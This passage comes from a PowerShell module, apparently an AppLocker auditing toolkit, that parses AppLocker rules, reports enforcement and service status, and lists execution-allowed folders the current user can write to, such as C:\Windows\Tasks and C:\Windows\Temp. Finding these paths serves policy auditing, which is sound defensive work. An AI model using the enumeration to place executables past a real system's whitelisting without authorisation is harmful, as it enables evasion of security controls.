            If($XML) #Method to export rules from registry to a valid XML file
            {
                $TempXML = "<AppLockerPolicy Version=`"1`"`>"
                foreach($RuleType in $RuleTypes)
                {
                    $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\$RuleType"
                    $AppLockerRulesRegistry = Get-childItem -path $RegPath
                    
                    $HeadersAllowWindows = (Get-ItemProperty -path $RegPath -Name "AllowWindows").AllowWindows
                    
                    $ValueExists = Get-ItemProperty -Path $RegPath -Name "EnforcementMode" -ErrorAction SilentlyContinue
                    If (($ValueExists -ne $null) -and ($ValueExists.Length -ne 0)) {
                        $EnforcementMode = (Get-ItemProperty -path $RegPath -Name "EnforcementMode").EnforcementMode
                        
                        If($EnforcementMode -eq "1")
                        {
                            $HeadersEnforcementMode = "Enabled"
                        }
                        elseif($EnforcementMode -eq "0")
                        {
                            $HeadersEnforcementMode = "Audit"
                        }    
                    }
                    else
                    {
                        $HeadersEnforcementMode = "NotConfigured"
                    }
  
                    $TempXML += "<RuleCollection Type=`"$RuleType`" EnforcementMode=`"$HeadersEnforcementMode`"`>"
	                foreach($rule in $AppLockerRulesRegistry)
                    {
	                	[XML]$RuleXML = (Get-ItemProperty -Path $rule.PSPath).value
	                	$TempXML += $RuleXML.InnerXML
                    }
                    #End the ruletype currently proccessing
	                $TempXML += "</RuleCollection`>"
                }
                $TempXML += "</AppLockerPolicy`>"
                return ([xml]$TempXML)
            }
            else
            {
                $AllRulesArray = @()
                if($RuleSection -ne "All")
                {
                    $RuleTypes = @($RuleSection)
                }
		    	foreach($RuleType in $RuleTypes)
                {
		    	    
                    Write-Verbose "Processing $RuleType"
		        	$SectionRules = Get-childItem -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\$RuleType"
                
		        	$ParentRulesObject = New-Object PSObject
		        	$ParentRulesObject | Add-Member NoteProperty 'Name' $RuleType
                
		        	#Array to store objects in
		        	$RulesArray = @()
                
		        	foreach($rule in $SectionRules) {
		        		[XML]$XML = (Get-ItemProperty -Path $rule.PSPath).value
                                    
		        		##Publisher rule
		        		if(($xml.FirstChild.LocalName) -eq "FilePublisherRule")
                        {
		        			if($OutputRules -eq "Publisher" -or $OutputRules -eq "All")
                            {
		        				if($xml.FirstChild.Action -eq $RuleActions -or $RuleActions -eq "All")
                                {
                                    if($xml.FirstChild.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                    {   

		        					    write-verbose "Publisher rule"
		        					    $RulesObject = New-Object PSObject
                                
		        					    #Common structure for all rule types
		        					    $RulesObject | Add-Member NoteProperty 'ParentName' $RuleType
                                        $RulesObject | Add-Member NoteProperty 'Ruletype' $xml.FirstChild.LocalName
		        					    $RulesObject | Add-Member NoteProperty 'Action' $xml.FirstChild.Action
		        					    $RulesObject | Add-Member NoteProperty 'SID' $xml.FirstChild.UserOrGroupSid
		        					    $RulesObject | Add-Member NoteProperty 'Description' $xml.FirstChild.Description
		        					    $RulesObject | Add-Member NoteProperty 'Name' $xml.FirstChild.Name
		        					    $RulesObject | Add-Member NoteProperty 'Id' $xml.FirstChild.Id
                                
		        					    #Special Publisher attributes
		        					    $RulesObject | Add-Member NoteProperty 'PublisherName' $xml.FilePublisherRule.Conditions.FilePublisherCondition.PublisherName
		        					    $RulesObject | Add-Member NoteProperty 'Productname' $xml.FilePublisherRule.Conditions.FilePublisherCondition.ProductName
		        					    $RulesObject | Add-Member NoteProperty 'BinaryName' $xml.FilePublisherRule.Conditions.FilePublisherCondition.BinaryName
		        					    $RulesObject | Add-Member NoteProperty 'LowSection' $xml.FilePublisherRule.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection
		        					    $RulesObject | Add-Member NoteProperty 'HighSection' $xml.FilePublisherRule.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection

                                        #Exceptions
                                        if($xml.FirstChild.Exceptions.FilePathCondition)
                                        {
                                            $RealExceptionsPath = Expand-PALPath -Path $($xml.FirstChild.Exceptions.FilePathCondition.Path)
                                            $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                            $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $xml.FirstChild.Exceptions.FilePathCondition.Path
                                        }
                                        if($xml.FirstChild.Exceptions.FileHashCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'HashExceptions' $xml.FirstChild.Exceptions.FileHashCondition
                                        }
                                        if($xml.FirstChild.Exceptions.FilePublisherCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $xml.FirstChild.Exceptions.FilePublisherCondition
                                        }

                                        $RulesArray += $RulesObject 
                                    }
		        				}
		        			}
		        		}
                    
		        		##File hash rule
		        		if(($xml.FirstChild.LocalName) -eq "FileHashRule")
                        {
		        			if($OutputRules -eq "Hash" -or $OutputRules -eq "All")
                            {
		        				if($xml.FirstChild.Action -eq $RuleActions -or $RuleActions -eq "All")
                                {
                                    if($xml.FirstChild.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                    {
                                        write-verbose "Hash rule"
		        					    $RulesObject = New-Object PSObject

		        					    #Common structure for all rule types
                                        $RulesObject | Add-Member NoteProperty 'ParentName' $RuleType
		        					    $RulesObject | Add-Member NoteProperty 'Ruletype' $xml.FirstChild.LocalName
		        					    $RulesObject | Add-Member NoteProperty 'Action' $xml.FirstChild.Action
		        					    $RulesObject | Add-Member NoteProperty 'SID' $xml.FirstChild.UserOrGroupSid
		        					    $RulesObject | Add-Member NoteProperty 'Description' $xml.FirstChild.Description
		        					    $RulesObject | Add-Member NoteProperty 'Name' $xml.FirstChild.Name
		        					    $RulesObject | Add-Member NoteProperty 'Id' $xml.FirstChild.Id

		        					    #Special Hash attributes
		        					    $RulesObject | Add-Member NoteProperty 'HashType' $xml.FileHashRule.Conditions.FileHashCondition.FileHash.Type
		        					    $RulesObject | Add-Member NoteProperty 'Hash' $xml.FileHashRule.Conditions.FileHashCondition.FileHash.Hash
		        					    $RulesObject | Add-Member NoteProperty 'Filename' $xml.FileHashRule.Conditions.FileHashCondition.FileHash.SourceFileName
		        					    $RulesObject | Add-Member NoteProperty 'Sourcefile Length' $xml.FileHashRule.Conditions.FileHashCondition.FileHash.SourceFileLength

                                        #Exceptions
                                        if($xml.FirstChild.Exceptions.FilePathCondition)
                                        {
                                            $RealExceptionsPath = Expand-PALPath -Path $($xml.FirstChild.Exceptions.FilePathCondition.Path)
                                            $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                            $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $xml.FirstChild.Exceptions.FilePathCondition.Path
                                        }
                                        if($xml.FirstChild.Exceptions.FileHashCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'HashExceptions' $xml.FirstChild.Exceptions.FileHashCondition
                                        }
                                        if($xml.FirstChild.Exceptions.FilePublisherCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $xml.FirstChild.Exceptions.FilePublisherCondition
                                        }

                                        $RulesArray += $RulesObject 
                                    }
		        				}
		        			}
		        		}
                    
		        		##Path rule
		        		if(($xml.FirstChild.LocalName) -eq "FilePathRule")
                        {
		        			if($OutputRules -eq "Path" -or $OutputRules -eq "All")
                            {
                                ## TEST CODE
                                if($ExceptionsAsDeny)
                                {
                                    if($xml.FirstChild.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                    {
                                        #Exceptions
                                        if($xml.FirstChild.Exceptions.FilePathCondition)
                                        {
                                            foreach($Exception in $xml.FirstChild.Exceptions.FilePathCondition)
                                            {
                                                $ExceptionPath = Expand-PALPath -Path $($Exception.Path)
                                                $RulesObject = New-Object PSObject
                            
                                                #Common structure for all rule types
                                                $RulesObject | Add-Member NoteProperty 'ParentName' $RuleType
                                                $RulesObject | Add-Member NoteProperty 'Ruletype' $xml.FirstChild.LocalName
                                                $RulesObject | Add-Member NoteProperty 'Action' 'Deny'
                                                $RulesObject | Add-Member NoteProperty 'SID' $xml.FirstChild.UserOrGroupSid
                                                $RulesObject | Add-Member NoteProperty 'Description' $xml.FirstChild.Description
                                                $RulesObject | Add-Member NoteProperty 'Name' $xml.FirstChild.Name
                                                $RulesObject | Add-Member NoteProperty 'Id' $xml.FirstChild.Id

                                                #Special Path attributes
                                                $RulesObject | Add-Member NoteProperty 'Path' $ExceptionPath
                                                $RulesObject | Add-Member NoteProperty 'RulePath' $Exception.Path

                                                $RulesArray += $RulesObject
                                            }
                                        }
                                    }
                                }

		        				if($xml.FirstChild.Action -eq $RuleActions -or $RuleActions -eq "All")
                                {
                                    $RealPath = Expand-PALPath -Path $($xml.FirstChild.Conditions.FilePathCondition.Path)
                                    if($xml.FirstChild.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                    {
		        					    write-verbose "Path rule"
                                        foreach($Path in $RealPath)
                                        {
		        					        $RulesObject = New-Object PSObject
                        
		        					        #Common structure for all rule types
                                            $RulesObject | Add-Member NoteProperty 'ParentName' $RuleType
		        					        $RulesObject | Add-Member NoteProperty 'Ruletype' $xml.FirstChild.LocalName
		        					        $RulesObject | Add-Member NoteProperty 'Action' $xml.FirstChild.Action
		        					        $RulesObject | Add-Member NoteProperty 'SID' $xml.FirstChild.UserOrGroupSid
		        					        $RulesObject | Add-Member NoteProperty 'Description' $xml.FirstChild.Description
		        					        $RulesObject | Add-Member NoteProperty 'Name' $xml.FirstChild.Name
		        					        $RulesObject | Add-Member NoteProperty 'Id' $xml.FirstChild.Id

		        					        #Special Path attributes
		        					        $RulesObject | Add-Member NoteProperty 'Path' $Path
                                            $RulesObject | Add-Member NoteProperty 'RulePath' $xml.FilePathRule.Conditions.FilePathCondition.Path

                                            #Exceptions
                                            if(!($ExceptionsAsDeny))
                                            {
                                                if($xml.FirstChild.Exceptions.FilePathCondition)
                                                {
                                                    $RealExceptionsPath = Expand-PALPath -Path $($xml.FirstChild.Exceptions.FilePathCondition.Path)
                                                    $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                                    $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $xml.FirstChild.Exceptions.FilePathCondition.Path
                                                }
                                                if($xml.FirstChild.Exceptions.FileHashCondition)
                                                {
                                                    $RulesObject | Add-Member NoteProperty 'HashExceptions' $xml.FirstChild.Exceptions.FileHashCondition
                                                }
                                                if($xml.FirstChild.Exceptions.FilePublisherCondition)
                                                {
                                                    $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $xml.FirstChild.Exceptions.FilePublisherCondition
                                                }
                                            }
                                            
                                            $RulesArray += $RulesObject 
                                        }
		        				    }
                                }
		        			}
		        		}
		        	}
                                    
		        	# Only add to object if rules are found
		        	if($RulesArray) {
                        $ParentRulesObject | Add-Member NoteProperty -Name RulesList -Value $RulesArray
		        		$AllRulesarray += $ParentRulesObject
		        	}
		        }

		        if($AllRulesArray)
                {
                    return $AllRulesArray
		        }
            }

        }
        Catch
        {
            Write-Error $_
        }
        Finally{}
    }
}

function Get-PALRuleSectionStatus
{
<#
.SYNOPSIS

Returns current status on the local machine of the AppLocker rule sections.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Will check against local registry to figure out what status the different AppLocker rule sections is at for the applied AppLocker policy.
Status can be either "Not Configured", "Enforced" or "Auditing"

.EXAMPLE

PS C:\> Get-PALRuleSectionStatus

Name   Status  
----   ------  
Appx   Enforced
Dll    Enforced
Exe    Enforced
Msi    Auditing
Script Not configured
#>

# Function Version: 1.0

    [CmdletBinding()] Param ()
    Process
    {
        Try
        {
            $OutArray = @()

		    $RuleTypes = @("Appx","Dll","Exe","Msi","Script")
		    foreach($RuleType in $RuleTypes)
            {
                $Out = New-Object PSObject
                $RegPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\$RuleType"

		    	# EnforcementMode missing = Not configured
		    	# EnforcementMode 0 = Audit mode
		    	# EnforcementMode 1 = Enforced
                $RuleStatus = Get-ItemProperty -Path $RegPath -Name "EnforcementMode" -ErrorAction SilentlyContinue
                If (($RuleStatus -ne $null) -and ($RuleStatus.Length -ne 0)) {
                    $EnforcementMode = (Get-ItemProperty -path $RegPath -Name "EnforcementMode").EnforcementMode
                        
                    If($EnforcementMode -eq "1")
                    {
                        $Result = "Enforced"
                    }
                    elseif($EnforcementMode -eq "0")
                    {
                        $Result = "Audit"
                    }    
                }
                else
                {
                    $Result = "NotConfigured"
                }

		    	$Out | Add-Member Noteproperty -name "Name" $RuleType
		    	$Out | Add-Member Noteproperty -name "Status" $Result
                $OutArray += $Out
		    }
		    return $OutArray
        }
        Catch
        {
            write-error $_
        }
        Finally{}
    }
}

function Get-PALRulesNative
{
#Requires -Modules AppLocker
<#
.SYNOPSIS

The function Get-PALRulesNative returns the AppLocker rules as an object that is current on the local machine using the native Powershell Get-AppLockerPolicy cmdlet.
 

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-AppLockerPolicy (Native windows), Expand-PALPaths
Optional Dependencies: None

.DESCRIPTION

Will use the get-applockerpolicy cmdlet to find the effective AppLocker rules. 
The function converts it to a PSobject before it returns it.

.PARAMETER OutputRules

The type of rules you want to get. Default is "All".
Can be "All","Path","Publisher","Hash"

.PARAMETER RuleActions

What sort of rules you want. Default is "All"
Can be "All","Allow","Deny"

.PARAMETER SID

The SID you want to get the rules for. 
Default is S-1-1-0. (Admin rules will not show up default as a consequence of that.)
If you want all you can supply *
List of well-known SIDs can be found here: https://support.microsoft.com/en-au/help/243330/well-known-security-identifiers-in-windows-operating-systems 

.PARAMETER XML

Switch. Returns output in XML format instead of Powershell objects. 

.PARAMETER OfflineXML

Path to OfflineXML that you have exported. 
This makes the function parse that file instead of the current AppLocker policy on the machine this script is running on.

.EXAMPLE
Gets all the AppLocker rules

PS C:\> Get-PALRules

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Appx {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged ap...
Exe  {@{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%OSDRIVE%\inetpub; Id=16d974b5-279a-49a3-92c3-42b91050...
Msi  {@{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run all Windows Inst...

.EXAMPLE
	
Gets all path rules that are defined with the deny Action

PS C:\> Get-PALRules -OutputRules Path -RuleActions Deny

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Exe  {@{Ruletype=FilePathRule; Action=Deny; SID=S-1-1-0; Description=; Name=%OSDRIVE%\inetpub; Id=16d974b5-279a-49a3-92c3-42b91050...

.EXAMPLE

Gets all the denied path rules and shows only the paths

PS C:\> (Get-PALRules -OutputRules Path -RuleActions Deny).RulesList.Path
%OSDRIVE%\inetpub\*
%WINDIR%\Microsoft.NET\*

.EXAMPLE

Gets all the publisher rules

PS C:\> Get-PALRules -OutputRules Publisher

Name RulesList                                                                                                                       
---- ---------                                                                                                                       
Appx {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged ap...
Exe  {@{Ruletype=FilePublisherRule; Action=Deny; SID=S-1-1-0; Description=; Name=CIPHER.EXE, in MICROSOFT® WINDOWS® OPERATING SYST...
Msi  {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run digitally s...

.EXAMPLE

Exports the rules to an XML file

PS C:\> (Get-PALRules -XML).Save("c:\folder\Export.xml")

.EXAMPLE
    
Gets AppLocker rules from the specified XML file

PS C:\> Get-PALRules -OfflineXML C:\folder\Export.xml


Name   RulesList                                                                                                                                                                                     
----   ---------                                                                                                                                                                                     
Appx   {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run packaged apps that are signed.; Name=(Default Rule) All signed packaged a...
Exe    {@{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run applications that are located in the Program Files folder.; Name=(Default Rule...
Msi    {@{Ruletype=FilePublisherRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run digitally signed Windows Installer files.; Name=(Default Rule) All digita...
Script {@{Ruletype=FilePathRule; Action=Allow; SID=S-1-1-0; Description=Allows members of the Everyone group to run scripts that are located in the Program Files folder.; Name=(Default Rule) All...
#>

# Function Version: 1.0

    [CmdletBinding()] Param (
        [ValidateSet("All","Path","Publisher","Hash")]
        [String]
        $OutputRules = "All",
        
        [ValidateSet("All","Allow","Deny")]
        [String]
        $RuleActions = "All",

        [String]
        #S-1-1-0 = Everyone - Default
        #* = ALL Sids
        $SID = "S-1-1-0",

        [Switch]
        $XML,

        [String]
        $OfflineXML
    )
    Process
    {
        Try
        {
            If($OfflineXML)
            {
                [XML]$Rules = Get-content -Path $OfflineXML
            }
            else
            {
                [XML]$Rules = Get-AppLockerPolicy -Effective -xml		
            }

            # All rules to XML as output if XML switch is on
            if($XML)
            {
                if($OutputRules -eq "All" -and $RuleActions -eq "All")
                {
                    return $Rules
                }
                else
                {
                    # Need a method to get selection rules to XML!
                    # Maybe V.next
                    "I do not support XML export of subset of rules and actions. Maybe next version - Sorry...."
                    return $null
                }
            }

            $AllRulesArray = @()

            foreach($col in $Rules.AppLockerPolicy.RuleCollection)
            {

                $ParentRulesObject = New-Object PSObject
		        $ParentRulesObject | Add-Member NoteProperty 'Name' $col.Type
                
		    	#Array to store objects in
		        $RulesArray = @()
            
                if($col.FilePublisherRule)
                {
                    if($OutputRules -eq "Publisher" -or $OutputRules -eq "All")
                    {
                        foreach($co in $col.FilePublisherRule)
                        {
                            if($co.action -eq $RuleActions -or $RuleActions -eq "All")
                            {
                                if($co.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                {
                                    $RulesObject = New-Object PSObject
                                                
            			            #Common structure for all rule types
            			            $RulesObject | Add-Member NoteProperty 'Ruletype' "FilePublisherRule"
            			            $RulesObject | Add-Member NoteProperty 'Action' $co.Action
            			            $RulesObject | Add-Member NoteProperty 'SID' $co.UserOrGroupSid
            			            $RulesObject | Add-Member NoteProperty 'Description' $co.Description
            			            $RulesObject | Add-Member NoteProperty 'Name' $co.Name
            			            $RulesObject | Add-Member NoteProperty 'Id' $co.Id
                                    
            			            #Special Publisher attributes
            			            $RulesObject | Add-Member NoteProperty 'PublisherName' $co.Conditions.FilePublisherCondition.PublisherName
            			            $RulesObject | Add-Member NoteProperty 'Productname' $co.Conditions.FilePublisherCondition.ProductName
            			            $RulesObject | Add-Member NoteProperty 'BinaryName' $co.Conditions.FilePublisherCondition.BinaryName
            			            $RulesObject | Add-Member NoteProperty 'LowSection' $co.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection
            			            $RulesObject | Add-Member NoteProperty 'HighSection' $co.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection
                                    
                                    #Exceptions
                                    if($co.Exceptions.FilePathCondition)
                                    {
                                        $RealExceptionsPath = Expand-PALPath -Path $($co.Exceptions.FilePathCondition.Path)
                                        $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                        $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $co.Conditions.FilePathCondition.Path
                                    }
                                    if($co.Exceptions.FileHashCondition)
                                    {
                                        $RulesObject | Add-Member NoteProperty 'HashExceptions' $co.Exceptions.FileHashCondition
                                    }
                                    if($co.Exceptions.FilePublisherCondition)
                                    {
                                        $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $co.Exceptions.FilePublisherCondition
                                    }

                                    $RulesArray += $RulesObject
                                }
                            }
                        }
                    }
                }
            
                if($col.FilePathRule)
                {
                    if($OutputRules -eq "Path" -or $OutputRules -eq "All")
                    {
                        foreach($co in $col.FilePathRule)
                        {
                            if($co.action -eq $RuleActions -or $RuleActions -eq "All")
                            {
                                $RealPath = Expand-PALPath -Path $($co.Conditions.FilePathCondition.Path)
                                if($co.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                {
                                    foreach($Path in $RealPath)
                                    {
                                        $RulesObject = New-Object PSObject
                                            
                                        #Common structure for all rule types
                                        $RulesObject | Add-Member NoteProperty 'Ruletype' "FilePathRule"
                                        $RulesObject | Add-Member NoteProperty 'Action' $co.Action
                                        $RulesObject | Add-Member NoteProperty 'SID' $co.UserOrGroupSid
                                        $RulesObject | Add-Member NoteProperty 'Description' $co.Description
                                        $RulesObject | Add-Member NoteProperty 'Name' $co.Name
                                        $RulesObject | Add-Member NoteProperty 'Id' $co.Id
                                
                                        #Special Path attributes
                                        $RulesObject | Add-Member NoteProperty 'Path' $Path
                                        $RulesObject | Add-Member NoteProperty 'RulePath' $co.Conditions.FilePathCondition.Path
                                        
                                        #Exceptions
                                        if($co.Exceptions.FilePathCondition)
                                        {
                                            $RealExceptionsPath = Expand-PALPath -Path $($co.Exceptions.FilePathCondition.Path)
                                            $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                            $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $co.Exceptions.FilePathCondition.Path
                                        }
                                        if($co.Exceptions.FileHashCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'HashExceptions' $co.Exceptions.FileHashCondition
                                        }
                                        if($co.Exceptions.FilePublisherCondition)
                                        {
                                            $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $co.Exceptions.FilePublisherCondition
                                        }
                                
                                        $RulesArray += $RulesObject
                                    }
                                }
                            }
                        }
                    }
                }
                if($col.FileHashRule)
                {
                    if($OutputRules -eq "Hash" -or $OutputRules -eq "All")
                    {
                        foreach($co in $col.FileHashRule)
                        {
                            if($co.action -eq $RuleActions -or $RuleActions -eq "All")
                            {
                                if($co.UserOrGroupSid -eq $SID -or $SID -eq "*")
                                {
                                    $RulesObject = New-Object PSObject
                                        
            			            #Common structure for all rule types
            			            $RulesObject | Add-Member NoteProperty 'Ruletype' "FileHashRule"
            			            $RulesObject | Add-Member NoteProperty 'Action' $co.Action
            			            $RulesObject | Add-Member NoteProperty 'SID' $co.UserOrGroupSid
            			            $RulesObject | Add-Member NoteProperty 'Description' $co.Description
            			            $RulesObject | Add-Member NoteProperty 'Name' $co.Name
            			            $RulesObject | Add-Member NoteProperty 'Id' $co.Id
            
            			            #Special Hash attributes
            			            $RulesObject | Add-Member NoteProperty 'HashType' $co.Conditions.FileHashCondition.FileHash.Type
            			            $RulesObject | Add-Member NoteProperty 'Hash' $co.Conditions.FileHashCondition.FileHash.Hash
            			            $RulesObject | Add-Member NoteProperty 'Filename' $co.Conditions.FileHashCondition.FileHash.SourceFileName
            			            $RulesObject | Add-Member NoteProperty 'Sourcefile Length' $co.Conditions.FileHashCondition.FileHash.SourceFileLength
                                    
                                    #Exceptions
                                    if($co.Exceptions.FilePathCondition)
                                    {
                                        $RealExceptionsPath = Expand-PALPath -Path $($co.Exceptions.FilePathCondition.Path)
                                        $RulesObject | Add-Member NoteProperty 'PathExceptions' $RealExceptionsPath
                                        $RulesObject | Add-Member NoteProperty 'RulePathExceptions' $co.Conditions.FilePathCondition.Path
                                    }
                                    if($co.Exceptions.FileHashCondition)
                                    {
                                        $RulesObject | Add-Member NoteProperty 'HashExceptions' $co.Exceptions.FileHashCondition
                                    }
                                    if($co.Exceptions.FilePublisherCondition)
                                    {
                                        $RulesObject | Add-Member NoteProperty 'PublisherExceptions' $co.Exceptions.FilePublisherCondition
                                    }

                                    $RulesArray += $RulesObject
                                }
                            }
                        }
                    }
                }
                
		        # Only add to object if rules are found
		        if($RulesArray)
                {
		            $arrList=$RulesArray
		            #[System.Collections.ArrayList]$arrList=$RulesArray
		        	$ParentRulesObject | Add-Member NoteProperty -Name RulesList -Value $arrList
		        	$AllRulesarray += $ParentRulesObject
		        }
		    }

	        if($AllRulesArray)
            {
	        	return $AllRulesArray
	        }
        }
        Catch
        {
            Write-Error $_
        }
        Finally{}
    }
}

function Get-PALServiceStatus
{
<#
.SYNOPSIS

Returns the status on the Application Identity (AppIDSVC) service from the local machine.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-Process
Optional Dependencies: None

.DESCRIPTION

Checks the Application Identity service status using the get-service cmdlet.
Outputs: Name,Status,StartType

.EXAMPLE

PS C:\> Get-PALServiceStatus

Name      Status StartType
----      ------ ---------
AppIDSvc Stopped    Manual
#>    

# Function Version: 0.90

	[CmdletBinding()] Param ()
    Process
    {
        Try
        {
		    $Out = Get-Service -Name AppIDSvc
            return $Out | Select-Object Name,Status,StartType
        }
        Catch
        {
            Write-Error $_
        }
        Finally{}
    }
}


function Get-PALWriteableAllowedPaths
{
<#
.SYNOPSIS

Lists paths that are allowed for execution that the current user can write to or create. Currently does not handle Exceptions that are defined in rules, only explicit deny rules.

Author: @oddvarmoe
License: BSD 3-Clause
Required Dependencies: Get-PALWriteablePaths, Get-PALRules
Optional Dependencies: None

.DESCRIPTION

Retrieves the path from all the allowed AppLocker path rules and checks the paths against Get-PALWriteablePaths. 
It will also remove paths that are explicit denied.
Outputs: Name,Path

.PARAMETER Rerun
When this switch is used it will rerun the Get-PALWriteablePaths and give fresh results stored 
in the Global variable WriteablePaths

.PARAMETER RuleSection
What sort of section you want the rules for. Default is "All
Can be "All","Dll","Exe","Script","Appx","Msi". This Parameter is passed to the Get-PALRules.


.EXAMPLE

PS C:\> Get-PALWriteableAllowedPaths

		Name   Path                                                
----   ----                                                
Exe    C:\Windows\Tasks                                    
Exe    C:\Windows\Temp                                     
Exe    C:\Windows\tracing                                  
Exe    C:\Windows\Registration\CRMLog                      
Exe    C:\Windows\System32\FxsTmp                          
Exe    C:\Windows\System32\Tasks                           
Exe    C:\Windows\System32\com\dmp                         
Exe    C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
Exe    C:\Windows\System32\spool\PRINTERS                  
Exe    C:\Windows\System32\spool\SERVERS                   
Exe    C:\Windows\System32\spool\drivers\color             
Exe    C:\Windows\SysWOW64\FxsTmp                          
Exe    C:\Windows\SysWOW64\Tasks                           
Exe    C:\Windows\SysWOW64\com\dmp                         
Msi    C:\Windows\Tasks                                    
Msi    C:\Windows\Temp                                     
Msi    C:\Windows\tracing                                  
Msi    C:\Windows\Registration\CRMLog                      
Msi    C:\Windows\System32\FxsTmp                          
Msi    C:\Windows\System32\Tasks                           
Msi    C:\Windows\System32\com\dmp                         
Msi    C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
Msi    C:\Windows\System32\spool\PRINTERS                  
Msi    C:\Windows\System32\spool\SERVERS                   
Msi    C:\Windows\System32\spool\drivers\color             
Msi    C:\Windows\SysWOW64\FxsTmp                          
Msi    C:\Windows\SysWOW64\Tasks                           
Msi    C:\Windows\SysWOW64\com\dmp                         
Script C:\Windows\Tasks                                    
Script C:\Windows\Temp                                     
Script C:\Windows\tracing                                  
Script C:\Windows\Registration\CRMLog                      
Script C:\Windows\System32\FxsTmp                          
Script C:\Windows\System32\Tasks                           
Script C:\Windows\System32\com\dmp                         
Script C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
Script C:\Windows\System32\spool\PRINTERS                  
Script C:\Windows\System32\spool\SERVERS                   
Script C:\Windows\System32\spool\drivers\color             
Script C:\Windows\SysWOW64\FxsTmp                          
Script C:\Windows\SysWOW64\Tasks                           
Script C:\Windows\SysWOW64\com\dmp  
#>

# Function Version: 0.95

    [CmdletBinding()] Param (
        [Switch]
        $Rerun,

        [ValidateSet("All","Appx","Dll","Exe","Msi","Script")]
        [String]
        $RuleSection = "All"
    )
    Process
    {
        Try
        {
            $PathArray = @()
            $FinaleArray = @()
            
            $AllAppLockerRules = Get-PALRules -OutputRules Path -RuleActions Allow -RuleSection $RuleSection
            
            $AllPaths = "C:\"
            # Check if global variable exist. If it does, WriteablePaths has been runned.
            if(!($WriteablePaths))
            {
                Get-PALWriteablepaths -Path $AllPaths -ErrorAction SilentlyContinue
            }

            if($Rerun)
            {
                Get-PALWriteablepaths -Path $AllPaths -Rerun -ErrorAction SilentlyContinue
            }

            
            #Loop through each section DLL,EXE++
            foreach($SectionRules in $AllAppLockerRules)
            {
                # Fresh empty array for each section
                $AllowedPathsArray = @()
                
                #Loop through each rule in the section
                foreach($Rule in $SectionRules.RulesList)
                {
                    # Expand the AppLocker path variables into real paths
                    $Paths = Expand-PALPath -Path $Rule.RulePath
                    foreach($Path in $Paths)
                    {
                        
                        if($Path -match "\.\w{2,4}$")
                        #File
                        {
                        }
                        else
                        #Folder
                        {
                            #Loop through all writeable paths to see if there is a match. Add to list if there is.
                            #Compare using tolower and normalized paths
                            foreach($Wpath in $WriteablePaths)
                            {
                                if($(Join-Path -Path $($Wpath.ToLower()) -ChildPath $null) -like "$(Join-Path -Path $($Path.ToLower()) -ChildPath $null)*")
                                {
                                    # Only add if it is not in the array already
                                    if($AllowedPathsArray -notcontains $Wpath)
                                    {
                                        $AllowedPathsArray += $Wpath
                                    }
                                }
                            }        
                        }
                    }
                }
                
                foreach($AllowedPath in $AllowedPathsArray)
                {
                        $RuObject = New-Object PSObject
                        $RuObject | Add-Member NoteProperty Name $SectionRules.Name
                        $RuObject | Add-Member NoteProperty Path $AllowedPath
                        $PathArray += $RuObject
                }
            
            }

            # Remove deny rules from the PathArray array
            $DenyRules = Get-PALRules -OutputRules Path -RuleActions Deny -RuleSection $RuleSection -ExceptionsAsDeny
            
            # Check if Deny rules are present
            if($DenyRules)
            {
                foreach($PathObj in $PathArray)
                {
                    $Add = $true
                    foreach($DRP in $DenyRules[($DenyRules.Name.IndexOf($($PathObj.Name)))].ruleslist.path)
                    {
                        $diff = $($PathObj.path)
                        if($(join-path -path $diff -ChildPath $null) -like "*$(join-path -path $drp -ChildPath $null)*")
                        {
                            #Dont add, because it is a deny rule
                            $Add = $false

                        }
                    }
                    
